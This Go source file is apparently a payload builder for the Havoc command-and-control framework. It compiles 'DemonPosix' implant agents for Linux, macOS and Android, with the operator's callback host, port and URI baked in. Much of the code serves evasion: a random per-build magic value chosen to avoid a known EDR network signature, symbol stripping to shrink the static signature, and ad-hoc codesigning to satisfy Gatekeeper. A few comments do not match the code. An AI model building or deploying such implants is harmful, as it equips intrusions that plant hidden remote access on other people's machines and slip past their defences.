package builder

/*
 * builder_posix.go — Payload builder for DemonPosix (Linux / macOS agents).
 *
 * Compiles the C source tree under payloads/DemonPosix/ using the native
 * GCC or Clang toolchain available on the teamserver host.
 *
 * Build targets:
 *   POSIX_TARGET_LINUX_EXE    — ELF executable  (gcc / clang)
 *   POSIX_TARGET_LINUX_SO     — Shared library   (.so)
 *   POSIX_TARGET_MACOS_EXE    — Mach-O executable (cross or native clang)
 *   POSIX_TARGET_MACOS_DYLIB  — Mach-O dylib
 *
 * The output binary has the C2 parameters baked in as preprocessor defines:
 *   -DCONFIG_HOST=\"<host>\"
 *   -DCONFIG_PORT=<port>
 *   -DCONFIG_URI=\"<uri>\"
 *   -DCONFIG_SSL=<0|1>
 */

import (
	"encoding/binary"
	crand "crypto/rand"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"Havoc/pkg/logger"
	"Havoc/pkg/utils"
)

/* ── Build target constants ────────────────────────────────────────── */
const (
	POSIX_TARGET_LINUX_EXE   = 10
	POSIX_TARGET_LINUX_SO    = 11
	POSIX_TARGET_MACOS_EXE   = 12
	POSIX_TARGET_MACOS_DYLIB = 13
	POSIX_TARGET_ANDROID_EXE = 14   // statically linked ELF for Android (arm64/x64)
	POSIX_TARGET_ANDROID_SO  = 15   // shared library for Android (.so)
)

/* ── Arch constants (reuse ARCHITECTURE_X64 / _X86 from builder.go) ── */
// ARCHITECTURE_ARM64 = 9 (matches PROCESS_ARCH_ARM64 in DemonPosix.h)
const ARCHITECTURE_ARM64 = 9

/* ── PosixBuilderConfig ──────────────────────────────────────────────── */
type PosixBuilderConfig struct {
	/* Compiler binaries — auto-detected if empty.
	 *
	 * Linux cross-compilation from macOS uses zig cc with a musl target.
	 * zig is auto-detected on PATH (brew install zig).
	 * Native Linux builds use gcc/clang directly.
	 */
	CompilerLinuxX64   string // native Linux x64: "gcc" / "clang"
	CompilerLinuxArm64 string // native Linux arm64: "aarch64-linux-gnu-gcc"
	CompilerMacOS      string // macOS: "clang"
	ZigCC              string // zig for cross-compilation: "zig"

	DebugDev bool
	SendLogs bool
}

/* ── PosixBuilder ────────────────────────────────────────────────────── */
type PosixBuilder struct {
	config     PosixBuilderConfig
	sourcePath string

	Target int
	Arch   int

	/* C2 listener parameters */
	Host      string
	Port      int
	Uri       string
	Ssl       bool
	UserAgent string // must match listener's configured User-Agent exactly

	/* Evasion — override the default 0xDEADBEEF magic value with a random
	 * one generated per-build to avoid network signature detection. */
	MagicValue uint32

	OutputPath string
	CompileDir string

	SendConsoleMessage func(msgType, message string)
}

/* ── NewPosixBuilder ─────────────────────────────────────────────────── */
func NewPosixBuilder(cfg PosixBuilderConfig) *PosixBuilder {
	// Generate a random magic value per build — avoids the well-known
	// 0xDEADBEEF signature that EDRs use to flag Havoc traffic.
	var magicBuf [4]byte
	if _, err := crand.Read(magicBuf[:]); err != nil {
		// Fallback to time-based seed if crypto/rand fails
		magicBuf = [4]byte{0xCA, 0xFE, 0xBA, 0xBE}
	}
	magic := binary.BigEndian.Uint32(magicBuf[:])
	// Ensure it's not 0x00000000 or 0xFFFFFFFF (edge cases)
	if magic == 0 || magic == 0xFFFFFFFF { magic = 0xC0FFEE42 }

	pb := &PosixBuilder{
		config:     cfg,
		sourcePath: utils.GetTeamserverPath() + "/" + PayloadDir + "/DemonPosix",
		Target:     POSIX_TARGET_LINUX_EXE,
		Arch:       ARCHITECTURE_X64,
		MagicValue: magic,
	}

	/* Auto-detect zig (used for Linux cross-compilation from macOS) */
	if pb.config.ZigCC == "" {
		pb.config.ZigCC = detectCompiler([]string{"zig"})
	}

	/* Auto-detect native compilers */
	if pb.config.CompilerLinuxX64 == "" {
		pb.config.CompilerLinuxX64 = detectCompiler([]string{"gcc", "cc", "clang"})
	}
	if pb.config.CompilerLinuxArm64 == "" {
		pb.config.CompilerLinuxArm64 = detectCompiler([]string{
			"aarch64-linux-gnu-gcc", "aarch64-unknown-linux-gnu-gcc",
		})
	}
	if pb.config.CompilerMacOS == "" {
		pb.config.CompilerMacOS = detectCompiler([]string{"clang", "gcc"})
	}

	return pb
}

func detectCompiler(candidates []string) string {
	for _, c := range candidates {
		if path, err := exec.LookPath(c); err == nil {
			return path
		}
	}
	return ""
}

/* ── Build ───────────────────────────────────────────────────────────── */
func (pb *PosixBuilder) Build() bool {
	/* Validate source path */
	if _, err := os.Stat(pb.sourcePath); os.IsNotExist(err) {
		pb.msg("Error", fmt.Sprintf("DemonPosix source not found at: %s", pb.sourcePath))
		return false
	}

	/* Create temp compile directory */
	pb.CompileDir = "/tmp/havoc_posix_" + utils.GenerateID(8) + "/"
	if err := os.MkdirAll(pb.CompileDir, os.ModePerm); err != nil {
		pb.msg("Error", "Failed to create compile directory: "+err.Error())
		return false
	}
	defer func() {
		/* Leave CompileDir intact so the caller can retrieve the binary */
	}()

	/* Choose compiler and flags based on target */
	compiler, cflags, ldflags, outputExt := pb.resolveToolchain()
	if compiler == "" {
		pb.msg("Error", "No suitable compiler found for the selected target")
		return false
	}

	/* Collect .c source files.
	 * For Linux targets we exclude Transport.c (which needs libcurl) and
	 * instead compile TransportSocket.c (raw POSIX sockets, no curl dep).
	 * For macOS targets we use Transport.c (libcurl is available natively).
	 */
	isLinux := pb.Target == POSIX_TARGET_LINUX_EXE || pb.Target == POSIX_TARGET_LINUX_SO ||
		pb.Target == POSIX_TARGET_ANDROID_EXE || pb.Target == POSIX_TARGET_ANDROID_SO
	var sources []string
	sourceDirs := []string{"src/core", "src/crypt", "src/inject", "src/main"}
	for _, dir := range sourceDirs {
		pattern := filepath.Join(pb.sourcePath, dir, "*.c")
		matches, _ := filepath.Glob(pattern)
		for _, m := range matches {
			base := filepath.Base(m)
			if isLinux && base == "Transport.c" {
				continue // replaced by TransportSocket.c
			}
			if !isLinux && base == "TransportSocket.c" {
				continue // only used for Linux cross-builds
			}
			sources = append(sources, m)
		}
	}
	if len(sources) == 0 {
		pb.msg("Error", "No .c source files found in DemonPosix source tree")
		return false
	}

	/* Output file */
	if pb.OutputPath == "" {
		pb.OutputPath = pb.CompileDir + "demon_posix" + outputExt
	}

	/* Build the compile command.
	 *
	 * Argument order matters:
	 *   For zig cc: "zig" "cc" "-target" "..." [flags] [sources] "-o" out
	 *   For clang/gcc:       [flags] [sources] "-o" out
	 *
	 * cflags may start with "cc" (zig subcommand) so we always put cflags
	 * first, then sources, then output.
	 */
	args := strings.Fields(cflags) // may be ["cc", "-target", ...] or ["-std=c11", ...]

	/* Include dirs */
	args = append(args, "-I"+filepath.Join(pb.sourcePath, "include"))

	/* Defines — C2 config baked in */
	args = append(args, fmt.Sprintf("-DCONFIG_HOST=\"%s\"", escapeDefine(pb.Host)))
	args = append(args, fmt.Sprintf("-DCONFIG_PORT=%d", pb.Port))
	args = append(args, fmt.Sprintf("-DCONFIG_URI=\"%s\"", escapeDefine(pb.Uri)))
	if pb.Ssl {
		args = append(args, "-DCONFIG_SSL=1")
	} else {
		args = append(args, "-DCONFIG_SSL=0")
	}
	// Random magic value per build — avoids 0xDEADBEEF network signature
	args = append(args, fmt.Sprintf("-DCONFIG_MAGIC=0x%08X", pb.MagicValue))
	// User-Agent — must exactly match what the listener expects
	if pb.UserAgent != "" {
		args = append(args, fmt.Sprintf("-DCONFIG_UA=\"%s\"", escapeDefine(pb.UserAgent)))
	}

	/* Debug / release */
	if pb.config.DebugDev {
		args = append(args, "-DDEBUG", "-g", "-O0")
	} else {
		isMacOS := pb.Target == POSIX_TARGET_MACOS_EXE || pb.Target == POSIX_TARGET_MACOS_DYLIB
		if isMacOS {
			args = append(args, "-DNDEBUG", "-Os", "-Wl,-S")
		} else {
			args = append(args, "-DNDEBUG", "-Os")
		}
	}

	/* Source files (after all flags) */
	args = append(args, sources...)

	/* Output */
	args = append(args, "-o", pb.OutputPath)

	/* Linker flags */
	args = append(args, strings.Fields(ldflags)...)

	/* Libraries */
	if isLinux {
		// zig cc + musl: pthread is bundled, no curl needed (raw socket transport)
		// -static produces a fully static binary with zero runtime dependencies
		args = append(args, "-static")
	} else {
		// macOS: use system libcurl (always available) + CoreFoundation
		args = append(args, "-lcurl", "-lpthread")
		args = append(args, "-framework", "CoreFoundation")
	}

	/* Run compiler.
	 * For zig cc: compiler="zig", cflags starts with "cc -target ..."
	 * strings.Fields(cflags) produces ["cc", "-target", ...] which becomes
	 * the first args — so exec.Command("zig", "cc", "-target", ...) is correct.
	 */
	pb.msg("Info", fmt.Sprintf("Compiling with: %s %s", compiler, strings.Join(args, " ")))
	cmd := exec.Command(compiler, args...)
	output, err := cmd.CombinedOutput()

	if len(output) > 0 {
		pb.msg("Info", "Compiler output:\n"+string(output))
	}

	if err != nil {
		pb.msg("Error", "Compilation failed: "+err.Error())
		return false
	}

	// Post-build: strip symbols + ad-hoc code sign for macOS targets.
	// This removes debug symbols (reduces static signature surface) and
	// satisfies macOS Gatekeeper for unsigned binaries on newer OS versions.
	isMacOSTarget := pb.Target == POSIX_TARGET_MACOS_EXE || pb.Target == POSIX_TARGET_MACOS_DYLIB
	if isMacOSTarget {
		// Strip all symbols
		if stripPath, err := exec.LookPath("strip"); err == nil {
			stripCmd := exec.Command(stripPath, "-x", pb.OutputPath)
			if out, err := stripCmd.CombinedOutput(); err != nil {
				pb.msg("Warn", "strip failed: "+string(out))
			}
		}
		// Ad-hoc code sign (no identity needed — just makes it runnable on macOS)
		if csignPath, err := exec.LookPath("codesign"); err == nil {
			csignCmd := exec.Command(csignPath, "--sign", "-", "--force",
				"--timestamp=none", pb.OutputPath)
			if out, err := csignCmd.CombinedOutput(); err != nil {
				pb.msg("Warn", "codesign failed (non-fatal): "+string(out))
			} else {
				pb.msg("Info", "Binary stripped and ad-hoc signed")
			}
		}
	}

	pb.msg("Good", fmt.Sprintf("DemonPosix built successfully: %s", pb.OutputPath))
	return true
}

/* ── Toolchain resolution ─────────────────────────────────────────────── */
//
// Linux strategy:
//   Use "zig cc -target <triple>-linux-musl" for cross-compilation from any
//   host (macOS, Linux, Windows). zig bundles musl libc so the resulting
//   binary is fully static — zero runtime dependencies on the target.
//   Falls back to native gcc/clang if zig is not available AND we're already
//   on a Linux host.
//
// macOS strategy:
//   Use the host clang (AppleClang or LLVM) with -arch x86_64 / arm64.
//
func (pb *PosixBuilder) resolveToolchain() (compiler, cflags, ldflags, ext string) {

	zigPath := pb.config.ZigCC

	switch pb.Target {

	case POSIX_TARGET_LINUX_EXE:
		ext = ""
		arch := "x86_64"
		if pb.Arch == ARCHITECTURE_ARM64 {
			arch = "aarch64"
		}
		if zigPath != "" {
			// zig cc acts as a C compiler when invoked as "zig cc"
			compiler = zigPath
			// -target must be the very first argument — we prepend it via cflags
			cflags = fmt.Sprintf("cc -target %s-linux-musl -std=c11 -DTRANSPORT_RAW_SOCKET", arch)
		} else if arch == "x86_64" && pb.config.CompilerLinuxX64 != "" {
			compiler = pb.config.CompilerLinuxX64
			cflags   = "-std=c11 -fPIE -fstack-protector -DTRANSPORT_RAW_SOCKET"
			ldflags  = "-Wl,-z,relro,-z,now -pie"
		} else if arch == "aarch64" && pb.config.CompilerLinuxArm64 != "" {
			compiler = pb.config.CompilerLinuxArm64
			cflags   = "-std=c11 -fPIE -fstack-protector -DTRANSPORT_RAW_SOCKET"
			ldflags  = "-Wl,-z,relro,-z,now -pie"
		}

	case POSIX_TARGET_LINUX_SO:
		ext = ".so"
		arch := "x86_64"
		if pb.Arch == ARCHITECTURE_ARM64 {
			arch = "aarch64"
		}
		if zigPath != "" {
			compiler = zigPath
			cflags = fmt.Sprintf("cc -target %s-linux-musl -std=c11 -fPIC -DDEMON_SO -DTRANSPORT_RAW_SOCKET", arch)
			ldflags = "-shared"
		} else if arch == "x86_64" && pb.config.CompilerLinuxX64 != "" {
			compiler = pb.config.CompilerLinuxX64
			cflags   = "-std=c11 -fPIC -DDEMON_SO -DTRANSPORT_RAW_SOCKET"
			ldflags  = "-shared"
		}

	case POSIX_TARGET_ANDROID_EXE:
		// Android runs on Linux kernel — use zig cc targeting linux-musl.
		// A fully static musl binary runs on any Android version without NDK.
		ext = ""
		androidArch := "aarch64"
		if pb.Arch != ARCHITECTURE_ARM64 {
			androidArch = "x86_64"
		}
		if zigPath != "" {
			compiler = zigPath
			cflags = fmt.Sprintf("cc -target %s-linux-musl -std=c11 -DTRANSPORT_RAW_SOCKET", androidArch)
		} else if androidArch == "x86_64" && pb.config.CompilerLinuxX64 != "" {
			compiler = pb.config.CompilerLinuxX64
			cflags   = "-std=c11 -DTRANSPORT_RAW_SOCKET"
		}

	case POSIX_TARGET_ANDROID_SO:
		ext = ".so"
		androidArch2 := "aarch64"
		if pb.Arch != ARCHITECTURE_ARM64 {
			androidArch2 = "x86_64"
		}
		if zigPath != "" {
			compiler = zigPath
			cflags = fmt.Sprintf("cc -target %s-linux-musl -std=c11 -fPIC -DDEMON_SO -DTRANSPORT_RAW_SOCKET", androidArch2)
			ldflags = "-shared"
		}

	case POSIX_TARGET_MACOS_EXE:
		ext = ""
		compiler = pb.config.CompilerMacOS
		// No -std=c11: macOS system headers use BSD types (u_int, u_short, etc.)
		// that are only exposed in the default GNU/BSD mode, not strict C11.
		// -D_DARWIN_C_SOURCE enables BSD extensions explicitly.
		cflags = "-arch x86_64 -D_DARWIN_C_SOURCE"
		if pb.Arch == ARCHITECTURE_ARM64 {
			cflags = "-arch arm64 -D_DARWIN_C_SOURCE"
		}
		ldflags = ""

	case POSIX_TARGET_MACOS_DYLIB:
		ext = ".dylib"
		compiler = pb.config.CompilerMacOS
		cflags = "-arch x86_64 -fPIC -DDEMON_SO -D_DARWIN_C_SOURCE"
		if pb.Arch == ARCHITECTURE_ARM64 {
			cflags = "-arch arm64 -fPIC -DDEMON_SO -D_DARWIN_C_SOURCE"
		}
		ldflags = "-dynamiclib"
	}
	return
}

/* ── Helpers ─────────────────────────────────────────────────────────── */
func (pb *PosixBuilder) msg(msgType, message string) {
	if pb.SendConsoleMessage != nil {
		pb.SendConsoleMessage(msgType, "[PosixBuilder] "+message)
	}
	logger.Debug("[PosixBuilder] " + msgType + ": " + message)
}

func escapeDefine(s string) string {
	return strings.ReplaceAll(s, `"`, `\"`)
}

/* ── TargetName — human-readable target name ────────────────────────── */
func PosixTargetName(target int) string {
	switch target {
	case POSIX_TARGET_LINUX_EXE:
		return "Linux ELF Executable"
	case POSIX_TARGET_LINUX_SO:
		return "Linux Shared Library (.so)"
	case POSIX_TARGET_MACOS_EXE:
		return "macOS Mach-O Executable"
	case POSIX_TARGET_MACOS_DYLIB:
		return "macOS Dynamic Library (.dylib)"
	default:
		return fmt.Sprintf("Unknown (%d)", target)
	}
}
